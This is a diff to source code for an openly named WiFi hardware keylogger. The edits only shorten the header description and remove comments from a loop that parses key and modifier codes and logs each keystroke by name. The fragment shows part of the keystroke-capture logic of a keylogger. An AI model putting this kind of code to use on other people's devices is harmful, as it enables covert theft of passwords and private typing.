@@ -1,7 +1,7 @@
 /*
  *  Basic hardware keylogger WiFi
  *
- *  Explanation: Simple hardware keylogger with wireless connectivity (WiFi) with multiple layout support.
+ *  Explanation: Simple Wi-Fi keylogger with multiple layout support.
  * 
  *  Copyright (C) 2019 Joel Serna & Ernesto Sanchez
  *
@@ -4832,11 +4832,11 @@ void loop() {
     serial_data.toCharArray(serial_char, serial_data.length());
     tmp_keys = strtok(serial_char," ");
     tmp_modifiers = strtok(NULL," ");
-    keys = atoi(tmp_keys); // It's a key (example: a = 0x04)
-    modifiers = atoi(tmp_modifiers); // It's a modifier (example: shift = 0x02)
-    key_modifier = keys + modifiers, HEX; // It's a key + modifier (example: A = 0x04|0x02)
+    keys = atoi(tmp_keys);
+    modifiers = atoi(tmp_modifiers);
+    key_modifier = keys + modifiers, HEX;
 
-    if(modifiers == 0){ // It's a key
+    if(modifiers == 0){
       for (int i = 0; i < 11; i++){
         if(value_compare[i] == keys){
           logs.println(keys_compare[i]);
